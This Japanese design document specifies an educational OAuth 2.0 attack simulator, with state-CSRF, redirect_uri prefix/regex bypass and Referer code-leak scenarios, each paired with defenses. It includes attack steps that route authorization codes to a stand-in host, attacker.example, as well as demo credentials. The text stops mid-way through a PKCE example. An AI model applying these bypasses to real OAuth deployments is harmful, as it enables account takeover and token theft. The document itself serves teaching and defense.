---
title: 攻撃デモカタログ — OAuth 2.0 攻撃詳細
phase: design
last-updated: 2026-04-26
safety-reviewed: false
---

## 教育目的

本ファイルは **教育用シミュレーション** の実装設計である。
記載された攻撃手法は `localhost` 上の固定シードデータに対してのみ動作するよう設計されており、
実環境への攻撃を意図したものではない。

攻撃シミュレーションはすべて「この防御がなぜ必要か」を体感するための概念実証であり、
各シナリオには必ず防御策の解説と実装例が対になっている。

---

# 12. OAuth 2.0 攻撃詳細設計

## 1. 概要

本設計書は認証タブ `oauth` の Attacker View に追加する3件の攻撃シナリオを定義する。
既存の `server/routes/oauth-sim.ts` が実装する認可コード発行・トークン交換フローを前提とし、
新規の攻撃ルート `server/routes/attack-oauth.ts` でシミュレーションを完結させる。

### 既存 OAuth フロー実装の概要

| ルート | 機能 |
|--------|------|
| `GET  /api/oauth/authorize` | 認可サーバーのコンセント画面表示 (client_id 検証、redirect_uri 完全一致検証) |
| `POST /api/oauth/authorize` | ユーザー認証 + 認可コード発行 (UUIDv4、有効期限 10 分) |
| `POST /api/oauth/token`     | 認可コードとアクセストークンの交換 (アトミック used フラグ更新でリプレイ防止) |
| `GET  /api/oauth/resource`  | Bearer トークンを検証してリソースを返す |

`oauth_clients` テーブルのシードデータ:
- `client_id`: `"demo-app"`
- `client_secret`: `"demo-secret-12345"`
- `redirect_uris`: `["http://localhost:3000/auth/oauth/callback"]`

---

## 2. 攻撃シナリオ一覧テーブル

| # | シナリオ ID | 攻撃名 | CWE | CAPEC | OSI 層 | 深刻度 | 難易度 |
|---|-------------|--------|-----|-------|--------|--------|--------|
| A | `oauth-state-csrf` | state パラメータ欠落 CSRF | CWE-352 | CAPEC-62 | L7 | High | 2 |
| B | `oauth-redirect-uri-bypass` | redirect_uri 検証バイパス | CWE-601 | CAPEC-194 | L7 | High | 3 |
| C | `oauth-code-via-referer` | 認可コード傍受 (Referer 漏洩) | CWE-200 (CWE-598) | CAPEC-94 | L7 | Medium | 2 |

---

## 3. 既存防御側実装

### 3.1 認可コード発行フロー (`oauth-sim.ts`)

`POST /api/oauth/authorize` は以下の検証を実施している。

1. **client_id 存在確認**: `oauth_clients` テーブルへの SELECT で不明クライアントを拒否
2. **redirect_uri 完全一致検証**: `registeredUris.includes(redirectUri)` で登録済み URI と一文字単位で比較。前方一致・正規表現ではない
3. **ユーザー認証**: `bcrypt.compare` でパスワードを検証し、失敗時 401 を返す
4. **state の扱い**: 現在の実装は `state` を受け取り認可コードレスポンスに添付するが、**サーバー側での state 検証は行わない**。CSRF 対策は、コールバックを受けるクライアント側 (本アプリのフロント) が state を照合する責務を担う

### 3.2 トークン交換フロー (`oauth-sim.ts`)

`POST /api/oauth/token` は以下を実施している。

1. **クライアント認証**: `client_id + client_secret` の双方を検証
2. **認可コードのアトミックな無効化**: `UPDATE oauth_codes SET used = 1 WHERE code = ? AND used = 0` により、コードの二重使用 (リプレイ) を防止
3. **redirect_uri 一致確認**: トークン交換時の `redirect_uri` が認可時と一致するか確認

### 3.3 PKCE 対応状況

現在の `oauth-sim.ts` は **PKCE (RFC 7636) 未対応**。
`code_challenge` / `code_verifier` パラメータは受け付けない。
シナリオ C の防御策解説でこの欠如が認可コード傍受リスクを高める点を説明する。

---

## 4. シナリオ詳細

### 4.1 シナリオ A: state パラメータ欠落 CSRF

#### 概要

これは **CWE-352 / CAPEC-62** の概念実証です。OAuth 2.0 の `state` パラメータは CSRF トークンとして機能する。
クライアントが `state` を生成・送信せず、コールバック受信時に検証もしない場合、
攻撃者は被害者のブラウザで自分自身の認可コードを処理させ、
被害者のセッションを攻撃者のアカウントに紐付けることが可能な状況が生まれる。

#### CWE / CAPEC

| 項目 | 値 |
|------|-----|
| CWE | CWE-352 (Cross-Site Request Forgery) |
| CAPEC | CAPEC-62 (Cross-Site Request Forgery) |
| OSI 層 | 7 (Application) |
| 深刻度 | High |
| CVSS v3.1 参考スコア | 8.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) |

#### 前提条件

| 条件 | 説明 |
|------|------|
| 被害者が認証済み | `seed_alice` が認可サーバーにログイン中 |
| クライアントが state を省略 | `GET /api/oauth/authorize` に `state=` パラメータなし |
| コールバック時に state 検証なし | フロントエンドが受信した state を照合しない脆弱な実装 |
| 攻撃者は別アカウントを持つ | `attacker_charlie` 名義のアカウントが攻撃者の認可コードを取得済み |

#### AttackStep[]

```typescript
const stepsOauthStateCsrf: AttackStep[] = [
  {
    id: "1",
    kind: "probe",
    label: "Victim initiates login without state",
    labelJa: "被害者が state なしでログインを開始",
    status: "success",
    payload: {
      type: "http",
      request: {
        method: "GET",
        url: "/api/oauth/authorize?client_id=demo-app&redirect_uri=http://localhost:3000/auth/oauth/callback&scope=read",
        // state パラメータが意図的に省略されている
        headers: {},
      },
      response: {
        status: 200,
        body: {
          step: "authorization_page",
          client: { id: "demo-app", name: "OSI Reference Demo App" },
          state: "",
        },
      },
    },
    detail: "The client omits the state parameter. Without it, the callback cannot distinguish legitimate responses from forged ones.",
    detailJa: "クライアントが state パラメータを省略しています。これがない場合、コールバックで正規のレスポンスと偽造されたレスポンスを区別できません。",
    timestamp: Date.now(),
  },
  {
    id: "2",
    kind: "intercept",
    label: "Attacker observes authorization URL structure",
    labelJa: "攻撃者が認可 URL の構造を観察",
    status: "success",
    payload: {
      type: "http",
      request: {
        method: "POST",
        url: "/api/oauth/authorize",
        body: {
          client_id: "demo-app",
          redirect_uri: "http://localhost:3000/auth/oauth/callback",
          scope: "read",
          state: "",
          username: "attacker_charlie",
          password: "Passw0rd!",
        },
      },
      response: {
        status: 200,
        body: {
          step: "authorization_code_issued",
          code: "ATTACKER_CODE_XXXXXXXX",
          redirectUri: "http://localhost:3000/auth/oauth/callback?code=ATTACKER_CODE_XXXXXXXX&state=",
        },
      },
    },
    detail: "Attacker authenticates as their own account and obtains a valid authorization code linked to their identity.",
    detailJa: "攻撃者は自身のアカウントで認証し、攻撃者のアイデンティティに紐付いた正規の認可コードを取得します。",
    timestamp: Date.now(),
  },
  {
    id: "3",
    kind: "forge",
    label: "Craft malicious callback URL with attacker's code",
    labelJa: "攻撃者のコードで悪意あるコールバック URL を偽造",
    status: "success",
    payload: {
      type: "http",
      request: {
        method: "GET",
        url: "http://localhost:3000/auth/oauth/callback?code=ATTACKER_CODE_XXXXXXXX&state=",
        headers: {
          Cookie: "sessionid=VICTIM_SESSION_TOKEN",
        },
      },
    },
    detail: "Attacker tricks the victim into visiting the callback URL containing the attacker's code. Since the victim's browser already has a session, the code gets processed in the victim's context.",
    detailJa: "攻撃者は被害者を攻撃者のコードを含むコールバック URL に誘導します。被害者のブラウザにはセッションがあるため、攻撃者のコードが被害者のコンテキストで処理されます。",
    timestamp: Date.now(),
  },
  {
    id: "4",
    kind: "exploit",
    label: "Victim's session links to attacker account",
    labelJa: "被害者のセッションが攻撃者アカウントに紐付く",
    status: "success",
    payload: {
      type: "http",
      request: {
        method: "POST",
        url: "/api/oauth/attack/state-csrf",
        body: {
          useState: false,
          attackerCode: "ATTACKER_CODE_XXXXXXXX",
        },
      },
      response: {
        status: 200,
        body: {
          outcome: "succeeded",
          summary: "この実装は脆弱です: state 検証が省略されているため、CSRF が成立しました",
          linkedAccount: "attacker_charlie",
          victimSession: "VICTIM_SESSION_TOKEN",
        },
      },
    },
    detail: "The victim's client exchanges the attacker's code for tokens, effectively linking the victim's session to the attacker's identity.",
    detailJa: "被害者のクライアントが攻撃者のコードをトークンに交換し、被害者のセッションが攻撃者のアイデンティティに紐付きます。",
    timestamp: Date.now(),
  },
];

// 防御あり: state 生成 + 検証パス
const stepsOauthStateCsrfDefended: AttackStep[] = [
  // ... ステップ 1-3 は同様 (state 値付き) ...
  {
    id: "4",
    kind: "blocked",
    label: "State mismatch detected — CSRF blocked",
    labelJa: "state 不一致を検出 — CSRF を阻止",
    status: "blocked",
    payload: {
      type: "http",
      request: {
        method: "POST",
        url: "/api/oauth/attack/state-csrf",
        body: {
          useState: true,
          attackerCode: "ATTACKER_CODE_XXXXXXXX",
          victimState: "state_1714100000000",
          codeState: "",
        },
      },
      response: {
        status: 400,
        body: {
          outcome: "blocked",
          blockedBy: "oauth_state_mismatch",
          summaryJa: "防御が機能しました: state パラメータの不一致が検出され、コールバックが拒否されました",
        },
      },
    },
    timestamp: Date.now(),
  },
];
```

#### 期待結果

E-2 契約: 各リクエストで両モード (脆弱+堅牢) を 1 リクエスト内で並列実行し、5 ステップ完全形 (probe → tamper → forge → exploit → verify) を返す。`outcome` は常に `"succeeded"` 固定、HTTP ステータスは 200 固定。`blockedBy` には堅牢側で発火した防御識別子を記録する。

| 項目 | 値 |
|------|-----|
| `outcome` | `"succeeded"` (常に) |
| HTTP ステータス | 200 (常に) |
| `blockedBy` | `"oauth_state_mismatch"` (堅牢側 step 5 で state 不一致検出) |
| `steps[4].status` (脆弱側 exploit) | `"success"` (state 検証なしで認可コード受理) |
| `steps[5].status` (堅牢側 verify) | `"blocked"` |

#### 防御策

**RFC 6749 §10.12** に基づき、`state` パラメータの使用が推奨されている。

```typescript
// 防御実装例: クライアント側での state 生成と検証
// src/components/auth/attacks/oauth/StateCsrfDemo.tsx

// 認可リクエスト時: 暗号学的安全な乱数で state を生成
const state = crypto.randomUUID(); // 例: "a3f5c8e2-1b4d-4f7a-9c2e-8d6b3a5f0e1c"
sessionStorage.setItem("oauth_state", state);
// ← ブラウザの sessionStorage に保存 (ページ遷移をまたいで保持)

// コールバック受信時: state を照合
const receivedState = new URLSearchParams(location.search).get("state");
const savedState = sessionStorage.getItem("oauth_state");
if (receivedState !== savedState) {
  throw new Error("State mismatch — possible CSRF attack");
}
sessionStorage.removeItem("oauth_state"); // 使用後は削除
```

**codeHints:**
- `state` は最低 128 ビットのエントロピーを持つ暗号学的乱数 (`crypto.randomUUID()` または `crypto.getRandomValues()`) を使用すること
- `state` は認可リクエスト送信直前に生成し、セッションまたは `sessionStorage` に保存する
- コールバック受信後は必ず削除し、一度しか使用できないようにすること
- `localStorage` は XSS 攻撃に弱いため、`state` の保存先として推奨しない

#### API 契約

```
POST /api/oauth/attack/state-csrf
Content-Type: application/json

Request: {} (E-2: 両モードを並列実行するため body は空オブジェクト。
  攻撃者コード・state 値・被害者コンテキストは全てサーバー側のシード値から生成される。
  zod スキーマ: oauthAttackStateCsrfSchema = z.object({}))

Response: { data: AttackResult, _trace: ServerTrace }
  // data.outcome: "succeeded" (常に)
  // data.steps: 5 ステップ完全形 (probe → tamper → forge → exploit → verify)
  // data.blockedBy: "oauth_state_mismatch" (堅牢側 verify で発火)
  // data.extra: シナリオ固有フィールド (attackerCodeId / victimState / codeState 等)
```

#### _trace 設計

```typescript
// attack_log への記録
trace.addDbQuery({
  sql: "INSERT INTO oauth_codes ... (attacker_charlie's code)",
  params: ["ATTACKER_CODE_XXXXXXXX", "demo-app", ...],
  ms: 0,
});

// 攻撃ステップの記録
trace.addAttackStep({ id: "1", kind: "probe", ... });
trace.addAttackStep({ id: "4", kind: "exploit" | "blocked", ... });

// CryptoOp: state 生成 or 検証
trace.addCryptoOp({
  op: useState ? "state_verify" : "state_missing",
  input: useState ? `received=${receivedState}, saved=${victimState}` : "(state omitted)",
  output: useState ? "MISMATCH — rejected" : "NO VALIDATION — accepted",
  algo: "comparison",
  detail: useState ? "state mismatch detected" : "state validation skipped",
});
```

#### UI 設計

Attacker View に以下の2パス切替 UI を配置する。

```
┌─ Attacker View ───────────────────────────────────────────┐
│  ⚠ 教育用シミュレーション — 実環境を攻撃するためのコードではありません    │
├───────────────────────────────────────────────────────────┤
│  [○ state なし (脆弱)]  [● state あり (防御)]              │ ← Toggle
│                                                           │
│  被害者がログイン開始       ──→ 認可サーバー                │
│  攻撃者がコードを取得       ←── 認可サーバー                │
│  悪意あるコールバック送信   ──→ 被害者のブラウザ            │
│  コード交換 (state 検証なし) ──→ 認可サーバー              │
│  ▶ [攻撃を実行]                                           │
│                                                           │
│  結果: 「この実装は脆弱です: state 検証が省略されているため...」│
│  ─────────────────────────────────────────────────────── │
│  防御策: state パラメータに暗号学的乱数を使用し、          │
│         コールバック時に必ず照合してください               │
└───────────────────────────────────────────────────────────┘
```

#### i18n キー

| キー | 日本語 | English |
|------|--------|---------|
| `oauth.attack.state_csrf.name` | `state 欠落 CSRF` | `State Parameter CSRF` |
| `oauth.attack.state_csrf.step1` | `被害者が state なしでログインを開始` | `Victim initiates login without state` |
| `oauth.attack.state_csrf.step2` | `攻撃者が認可 URL の構造を観察` | `Attacker observes authorization URL structure` |
| `oauth.attack.state_csrf.step3` | `攻撃者のコードで悪意あるコールバック URL を偽造` | `Craft malicious callback URL with attacker's code` |
| `oauth.attack.state_csrf.step4_exploit` | `被害者のセッションが攻撃者アカウントに紐付く` | `Victim's session links to attacker account` |
| `oauth.attack.state_csrf.step4_blocked` | `state 不一致を検出 — CSRF を阻止` | `State mismatch detected — CSRF blocked` |
| `oauth.attack.state_csrf.result_vuln` | `この実装は脆弱です: state 検証が省略されているため、CSRF が成立しました` | `This implementation is vulnerable: CSRF succeeded because state validation was omitted` |
| `oauth.attack.state_csrf.result_defended` | `防御が機能しました: state パラメータの不一致が検出され、コールバックが拒否されました` | `Defense worked: state parameter mismatch detected — callback rejected` |
| `oauth.attack.state_csrf.defense_title` | `防御: state パラメータの検証` | `Defense: State Parameter Validation` |
| `oauth.attack.state_csrf.toggle_vuln` | `state なし (脆弱)` | `Without state (vulnerable)` |
| `oauth.attack.state_csrf.toggle_defended` | `state あり (防御)` | `With state (defended)` |

---

### 4.2 シナリオ B: redirect_uri 検証バイパス

#### 概要

これは **CWE-601 / CAPEC-194** の概念実証です。認可サーバーが `redirect_uri` を登録済み URI との
**完全一致**ではなく、**前方一致** や **正規表現の誤り** で検証する場合、
攻撃者は `https://victim.com.attacker.example/cb` のような細工した URI を指定して
認可コードを自身のサーバーに送らせることが可能な状況が生まれる。

本シミュレーションでは3種類の検証モードを比較する。

| 検証モード | ラベル | 挙動 |
|-----------|--------|------|
| `exact` | 完全一致 (安全) | `includes()` で配列に完全一致する URI のみ許可 |
| `prefix` | 前方一致 (脆弱) | `startsWith()` の誤用。登録 URI の先頭一致で許可 |
| `regex_bad` | 誤った正規表現 (脆弱) | ドット `.` をエスケープし忘れた正規表現 |

#### CWE / CAPEC

| 項目 | 値 |
|------|-----|
| CWE | CWE-601 (URL Redirection to Untrusted Site / 'Open Redirect') |
| CAPEC | CAPEC-194 (Fake the Source of Data) |
| OSI 層 | 7 (Application) |
| 深刻度 | High |
| CVSS v3.1 参考スコア | 8.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) |

#### 前提条件

| 条件 | 説明 |
|------|------|
| 登録済み redirect_uri | `http://localhost:3000/auth/oauth/callback` |
| 攻撃者が制御するドメイン | `attacker.example` (シミュレーション用。実リクエスト送信なし) |
| 検証モードが前方一致または誤正規表現 | `validationMode` パラメータで切替 |

#### AttackStep[]

```typescript
const stepsRedirectUriBypass: AttackStep[] = [
  {
    id: "1",
    kind: "probe",
    label: "Observe registered redirect_uri format",
    labelJa: "登録済み redirect_uri のフォーマットを観察",
    status: "success",
    payload: {
      type: "http",
      request: {
        method: "GET",
        url: "/api/oauth/authorize?client_id=demo-app&redirect_uri=http://localhost:3000/auth/oauth/callback&scope=read&state=legit_state",
        headers: {},
      },
      response: {
        status: 200,
        body: {
          step: "authorization_page",
          registeredRedirectUris: ["http://localhost:3000/auth/oauth/callback"],
        },
      },
    },
    detail: "Attacker identifies the registered redirect_uri to craft a bypass attempt.",
    detailJa: "攻撃者は登録済み redirect_uri を特定し、バイパス試行を設計します。",
    timestamp: Date.now(),
  },
  {
    id: "2",
    kind: "forge",
    label: "Craft attacker-controlled redirect_uri",
    labelJa: "攻撃者が制御する redirect_uri を偽造",
    status: "success",
    payload: {
      type: "generic",
      data: {
        validationMode: "prefix",
        registeredUri: "http://localhost:3000/auth/oauth/callback",
        attackerUri: "http://localhost:3000/auth/oauth/callback.attacker.example/steal",
        technique: "前方一致バイパス: 登録URIで始まる任意のURIが許可される",
        bypassReason: "startsWith('http://localhost:3000/auth/oauth/callback') → true",
      },
    },
    detail: "With prefix matching, any URI starting with the registered URI passes validation — including URIs on attacker-controlled domains.",
    detailJa: "前方一致では、登録 URI で始まる任意の URI が通過します。攻撃者が制御するドメインを含む URI も同様です。",
    timestamp: Date.now(),
  },
  {
    id: "3",
    kind: "exploit",
    label: "Authorization code sent to attacker's server",
    labelJa: "攻撃者のサーバーに認可コードが送信される",
    status: "success",
    payload: {
      type: "http",
      request: {
        method: "POST",
        url: "/api/oauth/attack/redirect-uri-bypass",
        body: {
          validationMode: "prefix",
          attackerRedirectUri: "http://localhost:3000/auth/oauth/callback.attacker.example/steal",
          username: "seed_alice",
          password: "Passw0rd!",
        },
      },
      response: {
        status: 200,
        body: {
          outcome: "succeeded",
          summaryJa: "この実装は脆弱です: 前方一致検証により攻撃者の redirect_uri が受理されました",
          attackerRedirectUri: "http://localhost:3000/auth/oauth/callback.attacker.example/steal",
          authCode: "CODE_NOW_AT_ATTACKER_EXAMPLE",
          note: "実環境では認可コードが attacker.example に送信されますが、このデモでは /api/oauth/attack/* 内でシミュレーションします",
        },
      },
    },
    timestamp: Date.now(),
  },
  {
    id: "4",
    kind: "blocked",
    label: "Exact-match validation rejects attacker URI",
    labelJa: "完全一致検証が攻撃者 URI を拒否",
    status: "blocked",
    payload: {
      type: "http",
      request: {
        method: "POST",
        url: "/api/oauth/attack/redirect-uri-bypass",
        body: {
          validationMode: "exact",
          attackerRedirectUri: "http://localhost:3000/auth/oauth/callback.attacker.example/steal",
        },
      },
      response: {
        status: 400,
        body: {
          outcome: "blocked",
          blockedBy: "oauth_redirect_uri_exact_match",
          summaryJa: "防御が機能しました: 完全一致検証が未登録の redirect_uri を拒否しました",
          error: "Invalid redirect_uri. Registered: http://localhost:3000/auth/oauth/callback",
        },
      },
    },
    timestamp: Date.now(),
  },
];

// 正規表現誤用パス (regex_bad モード)
const stepRegexBad: AttackStep = {
  id: "3",
  kind: "exploit",
  label: "Regex dot escape omission allows bypass",
  labelJa: "正規表現のドットエスケープ漏れでバイパス",
  status: "success",
  payload: {
    type: "generic",
    data: {
      validationMode: "regex_bad",
      pattern: "^http://localhost:3000/auth/oauth/callback",
      // ドット `.` がエスケープされていないため `callback` の任意文字にマッチ
      attackerUri: "http://localhost:3000/auth/oauth/callbackXattacker.example/steal",
      matchResult: true,
      explanation: "正規表現の `.` は任意の一文字にマッチするため、`callbackX` も通過してしまいます。正しくは `callback\\.` と書く必要があります。",
    },
  },
  timestamp: Date.now(),
};
```

#### 期待結果

E-2 契約: 1 リクエストで 3 つの検証モード (exact / prefix / regex_bad) を全て並列実行し、5 ステップ完全形を返す。`outcome` は常に `"succeeded"` 固定、HTTP ステータスは 200 固定。`blockedBy` には堅牢側 (exact match) で発火した防御識別子を記録する。

| 項目 | 値 |
|------|-----|
| `outcome` | `"succeeded"` (常に) |
| HTTP ステータス | 200 (常に) |
| `blockedBy` | `"oauth_redirect_uri_exact_match"` (堅牢側 step 5: exact match で攻撃 URI 拒否) |
| `steps[4].status` (脆弱側 exploit: prefix + regex_bad) | `"success"` (両方の脆弱版で攻撃 URI 受理) |
| `steps[5].status` (堅牢側 verify: exact match) | `"blocked"` |

#### 防御策

**RFC 6749 §3.1.2** および **RFC 6819 §5.2.3.5** は redirect_uri の完全一致検証を要求している。

```typescript
// 脆弱な実装 (前方一致)
const isValid = registeredUris.some(uri => redirectUri.startsWith(uri));  // NG

// 脆弱な実装 (ドットエスケープ漏れ正規表現)
const isValid = /^http:\/\/localhost:3000\/auth\/oauth\/callback/.test(redirectUri); // NG

// 安全な実装 (完全一致。oauth-sim.ts の既存実装)
const isValid = registeredUris.includes(redirectUri); // OK
```

**codeHints:**
- `redirect_uri` の検証は必ず文字列の完全一致 (`===` または `Array.includes()`) で行うこと
- 正規表現を使う場合はドット `.` を `\\.` にエスケープし、末尾に `$` を付けること
- `redirect_uri` の事前登録をクライアント登録時に必須とし、動的な URI 追加を許可しないこと
- 既存の `oauth-sim.ts` の `registeredUris.includes(redirectUri)` が安全な実装例となっている

#### API 契約

```
POST /api/oauth/attack/redirect-uri-bypass
Content-Type: application/json

Request: {
  "attackerRedirectUri"?: string  // 攻撃者が試みる redirect_uri (省略時はシード値を使用、最大 512 文字)
}
  // E-2: 検証モード選択不要。ハンドラが exact / prefix / regex_bad を全て並列実行する。
  // zod スキーマ: oauthAttackRedirectUriBypassSchema = z.object({ attackerRedirectUri: z.string().max(512).optional() })

Response: { data: AttackResult, _trace: ServerTrace }
  // data.outcome: "succeeded" (常に)
  // data.steps: 5 ステップ完全形
  // data.blockedBy: "oauth_redirect_uri_exact_match" (堅牢側で発火)
```

#### _trace 設計

```typescript
trace.addCryptoOp({
  op: `redirect_uri_validate(mode=${validationMode})`,
  input: `uri=${attackerRedirectUri}, registered=${registeredUri}`,
  output: isValid ? "ACCEPTED (脆弱)" : "REJECTED (安全)",
  algo: validationMode === "exact" ? "string_equality" : validationMode === "prefix" ? "startsWith" : "regex",
  detail: validationMode === "exact"
    ? "registeredUris.includes(redirectUri) — RFC 6749 §3.1.2 準拠"
    : validationMode === "prefix"
    ? "startsWith() による前方一致 — 設計上の欠陥"
    : "ドットエスケープ漏れ正規表現 — 設計上の欠陥",
});
```

#### UI 設計

3つの検証モードを切替えるラジオグループを配置する。

```
┌─ Attacker View ─────────────────────────────────────────────┐
│  ⚠ 教育用シミュレーション — 実環境を攻撃するためのコードではありません      │
├─────────────────────────────────────────────────────────────┤
│  検証モード:                                                  │
│    (●) 完全一致 (安全)    (○) 前方一致 (脆弱)               │
│    (○) 誤正規表現 (脆弱)                                     │
│                                                             │
│  攻撃者の redirect_uri:                                      │
│  http://localhost:3000/auth/oauth/callbackXattacker.example/steal │
│                                                             │
│  ▶ [検証を実行]                                             │
│                                                             │
│  結果: 「この実装は脆弱です: 前方一致検証により...」          │
│     または 「防御が機能しました: 完全一致検証が...」           │
│  ──────────────────────────────────────────────────────── │
│  防御策: RFC 6749 §3.1.2 は redirect_uri の完全一致を要求    │
└─────────────────────────────────────────────────────────────┘
```

#### i18n キー

| キー | 日本語 | English |
|------|--------|---------|
| `oauth.attack.redirect_bypass.name` | `redirect_uri 検証バイパス` | `redirect_uri Validation Bypass` |
| `oauth.attack.redirect_bypass.mode_exact` | `完全一致 (安全)` | `Exact match (safe)` |
| `oauth.attack.redirect_bypass.mode_prefix` | `前方一致 (脆弱)` | `Prefix match (vulnerable)` |
| `oauth.attack.redirect_bypass.mode_regex` | `誤正規表現 (脆弱)` | `Bad regex (vulnerable)` |
| `oauth.attack.redirect_bypass.step1` | `登録済み redirect_uri のフォーマットを観察` | `Observe registered redirect_uri format` |
| `oauth.attack.redirect_bypass.step2` | `攻撃者が制御する redirect_uri を偽造` | `Craft attacker-controlled redirect_uri` |
| `oauth.attack.redirect_bypass.step3_exploit` | `攻撃者のサーバーに認可コードが送信される` | `Authorization code sent to attacker's server` |
| `oauth.attack.redirect_bypass.step4_blocked` | `完全一致検証が攻撃者 URI を拒否` | `Exact-match validation rejects attacker URI` |
| `oauth.attack.redirect_bypass.result_vuln` | `この実装は脆弱です: {mode} 検証により攻撃者の redirect_uri が受理されました` | `This implementation is vulnerable: {mode} validation accepted the attacker's redirect_uri` |
| `oauth.attack.redirect_bypass.result_defended` | `防御が機能しました: 完全一致検証が未登録の redirect_uri を拒否しました` | `Defense worked: exact-match validation rejected unregistered redirect_uri` |

---

### 4.3 シナリオ C: 認可コード傍受 (Referer 漏洩)

#### 概要

これは **CWE-200 (CWE-598) / CAPEC-94** の概念実証です。OAuth 2.0 の認可コードは
コールバック URL のクエリパラメータ (`?code=...`) として渡される。
コールバックを受けたページが外部リソース (画像・スクリプト) を読み込む場合、
ブラウザは `Referer` ヘッダにそのページの URL (認可コードを含む) を付与して送信する可能性がある。
攻撃者がその外部サーバーのログを参照することで、認可コードを窃取できる状況が生まれる。

本シミュレーションでは攻撃者サーバーへの実リクエストは行わず、
ブラウザが送信するはずの `Referer` ヘッダを `_trace` に記録して可視化する。

#### CWE / CAPEC

| 項目 | 値 |
|------|-----|
| CWE | CWE-200 (Information Exposure) / CWE-598 (Use of GET Request Method with Sensitive Query Strings) |
| CAPEC | CAPEC-94 (Adversary in the Middle (AiTM)) |
| OSI 層 | 7 (Application) |
| 深刻度 | Medium |
| CVSS v3.1 参考スコア | 6.3 (AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N) |

#### 前提条件

| 条件 | 説明 |
|------|------|
| 認可コードがクエリパラメータで渡される | `?code=XXXX` を含むコールバック URL |
| コールバックページが外部リソースを読み込む | `<img src="https://attacker.example/pixel">` 等 |
| PKCE 未使用 | コードを傍受されただけでトークン交換に悪用される可能性がある |
| コードが短命 | 既存実装は 10 分有効。傍受後すぐに試行する必要あり |

#### AttackStep[]

```typescript
const stepsOauthCodeReferer: AttackStep[] = [
  {
    id: "1",
    kind: "probe",
    label: "Authorization code included in callback URL query string",
    labelJa: "認可コードがコールバック URL のクエリパラメータに含まれる",
    status: "success",
    payload: {
      type: "http",
      request: {
        method: "GET",
        url: "http://localhost:3000/auth/oauth/callback?code=LEAKED_CODE_XXXXXXXX&state=legit_state",
        headers: {
          Referer: "(このページ自体はまだ読み込まれていない)",
        },
      },
      response: {
        status: 200,
        body: {
          note: "コールバックページが読み込まれた。URLに認可コードが残っている。",
        },
      },
    },
    detail: "The authorization code is embedded in the URL as a query parameter. Any resource loaded from this page will receive the full URL in the Referer header.",
    detailJa: "認可コードが URL のクエリパラメータとして埋め込まれています。このページから読み込まれるリソースはすべて Referer ヘッダに完全な URL (コードを含む) を受け取ります。",
    timestamp: Date.now(),
  },
  {
    id: "2",
    kind: "intercept",
    label: "External resource triggers Referer header with code",
    labelJa: "外部リソースの読み込みが認可コードを含む Referer を送信",
    status: "success",
    payload: {
      type: "http",
      request: {
        method: "GET",
        url: "https://attacker.example/pixel.png",
        headers: {
          Referer: "http://localhost:3000/auth/oauth/callback?code=LEAKED_CODE_XXXXXXXX&state=legit_state",
          "User-Agent": "Mozilla/5.0 ...",
        },
      },
      response: {
        status: 200,
        body: "(1x1 pixel image — but server logs the Referer)",
      },
      tamperedFields: ["Referer"],
    },
    detail: "When the callback page contains <img src='https://attacker.example/pixel.png'>, the browser automatically sends the current page URL as Referer to the attacker's server.",
    detailJa: "コールバックページに `<img src='https://attacker.example/pixel.png'>` が含まれる場合、ブラウザは現在のページ URL を Referer として攻撃者のサーバーに自動的に送信します。",
    timestamp: Date.now(),
  },
  {
    id: "3",
    kind: "exploit",
    label: "Attacker extracts code from server access log",
    labelJa: "攻撃者がサーバーアクセスログからコードを抽出",
    status: "success",
    payload: {
      type: "generic",
      data: {
        serverLog: 'GET /pixel.png HTTP/1.1\nReferer: http://localhost:3000/auth/oauth/callback?code=LEAKED_CODE_XXXXXXXX&state=legit_state\nUser-Agent: Mozilla/5.0',
        extractedCode: "LEAKED_CODE_XXXXXXXX",
        note: "このデモでは /api/oauth/attack/code-via-referer がログ記録をシミュレーションします。実際の外部リクエストは送信しません。",
      },
    },
    detail: "Attacker reads their own server's access log and extracts the authorization code from the Referer header value.",
    detailJa: "攻撃者は自身のサーバーのアクセスログを参照し、Referer ヘッダの値から認可コードを抽出します。",
    timestamp: Date.now(),
  },
  {
    id: "4",
    kind: "exploit",
    label: "Stolen code exchanged for access token",
    labelJa: "盗んだコードをアクセストークンに交換",
    status: "success",
    payload: {
      type: "http",
      request: {
        method: "POST",
        url: "/api/oauth/attack/code-via-referer",
        body: {
          stolenCode: "LEAKED_CODE_XXXXXXXX",
          clientId: "demo-app",
          clientSecret: "demo-secret-12345",
        },
      },
      response: {
        status: 200,
        body: {
          outcome: "succeeded",
          summaryJa: "この実装は脆弱です: PKCE なしの認可コードは傍受後にトークン交換に悪用される可能性があります",
          access_token: "eyJhbGciOiJIUzI1NiJ9...",
          token_type: "Bearer",
          scope: "read",
        },
      },
    },
    timestamp: Date.now(),
  },
];

// PKCE 保護パス (防御あり)
const stepPkceProtected: AttackStep = {
  id: "4",
  kind: "blocked",
  label: "PKCE code_verifier check rejects stolen code",
  labelJa: "PKCE の code_verifier 検証が盗まれたコードを拒否",
  status: "blocked",
  payload: {
    type: "http",
    request: {
      method: "POST",
      url: "/api/oauth/attack/code-via-referer",
      body: {
        stolenCode: "LEAKED_CODE_XXXXXXXX",
        // code_verifier なしでトークン交換を試みる
        pkceEnabled: true,
      },
    },
    response: {
      status: 400,
      body: {
        outcome: "blocked",
        blockedBy: "pkce_code_verifier_missing",
        summaryJa: "防御が機能しました: PKCE の code_verifier が欠如しているため、盗んだコードは使用できません",
        error: "code_verifier required but not provided",
      },
    },
  },
  timestamp: Date.now(),
};
```

#### 期待結果

E-2 契約: 1 リクエストで PKCE なし (脆弱) と PKCE あり (堅牢) の両方を並列実行し、5 ステップ完全形を返す。`outcome` は常に `"succeeded"` 固定、HTTP ステータスは 200 固定。`blockedBy` には堅牢側で発火した防御識別子を記録する。

| 項目 | 値 |
|------|-----|
| `outcome` | `"succeeded"` (常に) |
| HTTP ステータス | 200 (常に) |
| `blockedBy` | `"pkce_code_verifier_missing"` (堅牢側 step 5: code_verifier 欠如で拒否) |
| `steps[4].status` (脆弱側 exploit: PKCE なし) | `"success"` (盗まれたコードでトークン交換成立) |
| `steps[5].status` (堅牢側 verify: PKCE あり) | `"blocked"` |

#### 防御策

**RFC 7636 (PKCE)** は認可コードの傍受攻撃を防ぐために設計されている。

```typescript
// PKCE を用いた防御実装例

// 1. 認可リクエスト前: code_verifier と code_challenge を生成
const codeVerifier = base64urlEncode(crypto.getRandomValues(new Uint8Array(32)));
